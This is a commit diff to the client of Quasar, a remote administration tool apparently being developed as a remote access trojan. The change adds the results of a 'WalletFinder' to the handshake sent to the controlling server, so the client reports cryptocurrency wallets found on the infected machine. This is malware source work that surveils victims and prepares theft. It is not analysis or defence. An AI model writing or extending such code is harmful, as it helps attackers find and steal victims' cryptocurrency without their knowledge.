826951faad60aef2ff1258fb84936cc267e878cc
JavaRenamed-dev <l39980927@gmail.com>
2025-03-28 22:15:04 +0100

    Update Wallet Finder

--- Quasar.Client/Networking/QuasarClient.cs
+++ Quasar.Client/Networking/QuasarClient.cs
@@ -274,7 +274,8 @@ public void ConnectLoop()
                     PcName = SystemHelper.GetPcName(),
                     Tag = Settings.TAG,
                     EncryptionKey = Settings.ENCRYPTIONKEY,
-                    Signature = Convert.FromBase64String(Settings.SERVERSIGNATURE)
+                    Signature = Convert.FromBase64String(Settings.SERVERSIGNATURE),
+                    Wallets = WalletFinder.WalletFinder.GetFoundWallets()
                 });
             }
         }
